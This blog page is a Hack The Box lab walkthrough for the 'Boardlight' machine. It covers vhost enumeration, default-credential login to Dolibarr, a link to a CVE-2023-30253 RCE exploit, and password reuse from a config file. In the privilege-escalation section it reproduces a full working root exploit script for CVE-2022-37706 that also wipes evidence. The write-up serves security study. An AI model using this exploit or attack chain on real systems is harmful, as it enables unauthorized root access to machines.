<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="">
<meta name="description" content="Easy Linux box" />
<meta name="keywords" content=", linux" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="http://localhost:1313/walkthroughs/boardlight/" />


    <title>
        
            Boardlight :: TheFizzyFish-blog 
        
    </title>





<link rel="stylesheet" href="/main.949191c1dcc9c4a887997048b240354e47152016d821198f89448496ba42e491.css" integrity="sha256-lJGRwdzJxKiHmXBIskA1TkcVIBbYIRmPiUSElrpC5JE=">



    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="/favicon.ico">
    <meta name="msapplication-TileColor" content="">



  <meta itemprop="name" content="Boardlight">
  <meta itemprop="description" content="Easy Linux box">
  <meta itemprop="datePublished" content="2024-08-24T16:50:47-04:00">
  <meta itemprop="dateModified" content="2024-08-24T16:50:47-04:00">
  <meta itemprop="wordCount" content="590">
  <meta itemprop="image" content="http://localhost:1313/">
  <meta itemprop="keywords" content="Linux">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/">
  <meta name="twitter:title" content="Boardlight">
  <meta name="twitter:description" content="Easy Linux box">







    <meta property="article:published_time" content="2024-08-24 16:50:47 -0400 EDT" />











    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text ">
                $ cd /root/</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/common/">Common.txt</a></li><li><a href="/walkthroughs/">Walkthroughs</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="http://localhost:1313/walkthroughs/boardlight/">Boardlight</a></h2>

            
            
            

            <div class="post-content">
                <p>A Really easy HTB box that looks into vhost enumeration and a CVE 2023-30253.</p>
<h1 id="enum">Enum</h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">3072</span> 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html; charset<span style="color:#f92672">=</span>UTF-8<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h2 id="80">80</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/BoardLight<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ whatweb $IP     
</span></span><span style="display:flex;"><span>http://10.10.11.11 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.41<span style="color:#f92672">]</span>, Bootstrap, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>, Email<span style="color:#f92672">[</span>info@board.htb<span style="color:#f92672">]</span>, HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>, IP<span style="color:#f92672">[</span>10.10.11.11<span style="color:#f92672">]</span>, JQuery<span style="color:#f92672">[</span>3.4.1<span style="color:#f92672">]</span>, Script<span style="color:#f92672">[</span>text/javascript<span style="color:#f92672">]</span>, X-UA-Compatible<span style="color:#f92672">[</span>IE<span style="color:#f92672">=</span>edge<span style="color:#f92672">]</span>
</span></span></code></pre></div><p>This took a while :( but have to check for vhosts when you have a domain.</p>
<p>We can us ffuf to do this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>fish㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/BoardLight<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb -H <span style="color:#e6db74">&#39;Host: FUZZ.board.htb&#39;</span> -fs <span style="color:#ae81ff">15949</span>
</span></span></code></pre></div><p>And we find one! <code>crm.board.htb</code>, we need to add it to our hosts file then we can browse to it directly</p>
<p>Looking through the source, we see some comments but I don&rsquo;t think these will help us.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- authentication mode = dolibarr --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- cookie name used for this session = DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92 --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- urlfrom in this session =  --&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- Common footer is not used for login page, this is same than footer but inside login tpl --&gt;</span>
</span></span></code></pre></div><p>A google search shows multiple exploits and a CVE(2023-30253):</p>
<hr>
<h1 id="foothold">Foothold</h1>
<p>We found the site is running a vulnerable version of Dolibarr a CRM with a RCE exploit available but it requires a valid username and password.</p>
<p>Trying the low hanging fruit <code>admin:admin</code> gets us in and we can run the first github exploit result after reading through the python code.</p>
<p>We&rsquo;re going to want to look for a config file because we know the app interfaces with mysql we might be able to find some hardcoded creds, linpeas doesn&rsquo;t pick up anything but if we look at the documentation for dolibarr we find it at <code>/var/www/html/crm.board.htb/htdocs/conf/conf.php</code></p>
<p><a href="https://wiki.dolibarr.org/index.php?title=Configuration_file">https://wiki.dolibarr.org/index.php?title=Configuration_file</a></p>
<p>And we get a potential password:</p>
<p><code>serverfun2$2023!!</code></p>
<p>We could potentially log into the database and look for anything else interesting or we can check for password re-use. We did find another user on  the box <code>larissa</code>.</p>
<p>Logging in with the cred above as larissa works!</p>
<h2 id="exploits">Exploits</h2>
<p>#CVE-2023-30253
<a href="https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253">https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253</a></p>
<hr>
<h1 id="privesc">PrivEsc</h1>
<p>Running linpeas again finds some interesting SUID binaries</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 27K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 15K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 15K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root 15K Jan <span style="color:#ae81ff">29</span>  <span style="color:#ae81ff">2020</span> /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset <span style="color:#f92672">(</span>Unknown SUID binary!<span style="color:#f92672">)</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/bash</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Idea by MaherAzzouz</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Development by nu11secur1ty</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;CVE-2022-37706&#34;</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[*] Trying to find the vulnerable SUID file...&#34;</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[*] This may take few seconds...&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># The actual problem</span>
</span></span><span style="display:flex;"><span>file<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>find / -name enlightenment_sys -perm -4000 2&gt;/dev/null | head -1<span style="color:#66d9ef">)</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> -z <span style="color:#e6db74">${</span>file<span style="color:#e6db74">}</span> <span style="color:#f92672">]]</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>	echo <span style="color:#e6db74">&#34;[-] Couldn&#39;t find the vulnerable SUID file...&#34;</span>
</span></span><span style="display:flex;"><span>	echo <span style="color:#e6db74">&#34;[*] Enlightenment should be installed on your system.&#34;</span>
</span></span><span style="display:flex;"><span>	exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Vulnerable SUID binary found!&#34;</span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Trying to pop a root shell!&#34;</span>
</span></span><span style="display:flex;"><span>mkdir -p /tmp/net
</span></span><span style="display:flex;"><span>mkdir -p <span style="color:#e6db74">&#34;/dev/../tmp/;/tmp/exploit&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;/bin/sh&#34;</span> &gt; /tmp/exploit
</span></span><span style="display:flex;"><span>chmod a+x /tmp/exploit
</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;[+] Welcome to the rabbit hole :)&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;If it is not found in fstab, big deal :D &#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">${</span>file<span style="color:#e6db74">}</span> /bin/mount -o noexec,nosuid,utf8,nodev,iocharset<span style="color:#f92672">=</span>utf8,utf8<span style="color:#f92672">=</span>0,utf8<span style="color:#f92672">=</span>1,uid<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>id -u<span style="color:#66d9ef">)</span>, <span style="color:#e6db74">&#34;/dev/../tmp/;/tmp/exploit&#34;</span> /tmp///net
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read -p <span style="color:#e6db74">&#34;Press any key to clean the evedence...&#34;</span>
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;Please wait... &#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sleep <span style="color:#ae81ff">5</span>
</span></span><span style="display:flex;"><span>rm -rf /tmp/exploit
</span></span><span style="display:flex;"><span>rm -rf /tmp/net
</span></span><span style="display:flex;"><span>echo -e <span style="color:#e6db74">&#34;Done; Everything is clear ;)&#34;</span>
</span></span></code></pre></div><p>We can create a exploit.sh with the exploit code, make it executable with <code>chmod +x </code>, and run it to get root.</p>
<h2 id="exploits-1">Exploits</h2>
<p><a href="https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2022-37706/docs/exploit.sh">https://raw.githubusercontent.com/nu11secur1ty/CVE-mitre/main/CVE-2022-37706/docs/exploit.sh</a>
#suid</p>
<hr>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="http://localhost:1313/tags/linux/">linux</a></span>
        
    </p>

            
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/"></a></span>
            <span></span>
            
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by Four Gnomes in a Hoodie</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.e89fda0f29b95d33f6f4224dd9e5cf69d84aff3818be2b0d73e731689cc374261b016d17d46f8381962fb4a1577ba3017b1f23509d894f6e66431f988c00889e.js" integrity="sha512-6J/aDym5XTP29CJN2eXPadhK/zgYvisNc&#43;cxaJzDdCYbAW0X1G&#43;DgZYvtKFXe6MBex8jUJ2JT25mQx&#43;YjACIng=="></script>




    </body>
</html>
